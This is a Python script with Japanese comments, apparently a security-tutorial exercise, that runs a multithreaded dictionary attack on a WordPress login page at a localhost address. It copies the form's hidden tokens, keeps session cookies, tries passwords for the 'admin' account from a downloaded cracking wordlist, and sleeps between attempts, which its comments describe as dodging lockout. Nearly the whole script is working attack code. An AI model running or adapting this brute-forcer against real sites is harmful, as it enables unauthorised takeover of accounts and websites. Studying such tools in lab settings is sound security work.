#HTMLフォームの認証を辞書攻撃で破る
#フォームに埋め込まれたトークンを受け取り、cookieを維持する。要件を満たす

#wget https://raw.githubsercontent.com/danielmiessler/SecLists/master/Passwords/Software/cain-and-abel.txt -O cain.txt


from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

#成功時のレスポンス。判定に使う
SUCCESS = 'Welcome to WordPress!'
#標的のログインフォーム
TARGET = "http://127.0.0.1:31337/wp-login.php"
#辞書
WORDLIST = 'cain.txt'


#辞書からワードを作成
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


#HTTPレスポンスからinput要素の必要パラメータを作成
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    #辞書攻撃
    def web_bruter(self, passwords):
        #cookieを管理
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        #単語リストが空になるか、成功するまで
        while not passwords.empty() and not self.found:
            try:
                #ロックアウト回避
                time.sleep(5)
                passwd = passwords.get()
                print(f'Trying username/password {self.username}/{passwd:<10}')
                #設定しPost
                params['pwd'] = passwd
                resp1 = session.post(self.url, data=params)
                
                #成功したら
                if SUCCESS in resp1.content.decode():
                    self.found = True
                    print(f"\nBruteforcing successful.")
                    print("Username is %s" % self.username)
                    print("Password is %s\n" % passwd)
            except:
                pass


if __name__ == '__main__':
    b = Bruter('admin', TARGET)
    words = get_words()
    b.run_bruteforce(words)
